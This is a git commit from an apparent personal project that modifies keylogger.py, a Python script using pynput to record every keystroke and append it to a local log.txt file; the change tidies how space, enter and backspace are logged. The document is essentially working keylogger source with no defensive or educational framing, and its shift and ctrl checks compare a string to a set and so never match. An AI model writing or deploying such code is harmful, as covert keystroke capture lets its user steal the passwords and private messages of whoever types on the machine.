c40d6d59f57c7c379e530692fe94a2a9b3d7a0cd
Padmakumar P B <padmakumarpb176@gmail.com>
2024-08-01 20:39:38 +0530

    modified the code

--- keylogger.py
+++ keylogger.py
@@ -1,9 +1,24 @@
 from pynput.keyboard import Listener
 
+log_file = "log.txt"
+
 def write_to_file(key):
-    key_data = str(key)
-    with open("log.txt","a") as key:
-        key.write(key_data)
+    letter = str(key)
+    letter = letter.replace("'","")
+
+    if letter == 'Key.space':
+        letter = ' '
+    elif letter == 'Key.enter':
+        letter = '\n'
+    elif letter == 'Key.backspace':
+        letter = '<backspace>'
+    elif letter == {'Key.shift', 'Key.shift_l', 'Key.shift_r'}:
+            letter = '<shift>'
+    elif letter == {'Key.ctrl', 'Key.ctrl_l', 'Key.ctrl_r'}:
+            letter = '<ctrl>'
+
+    with open(log_file,"a") as file:
+        file.write(letter)
 
 with Listener(on_press= write_to_file) as listen:
     listen.join()
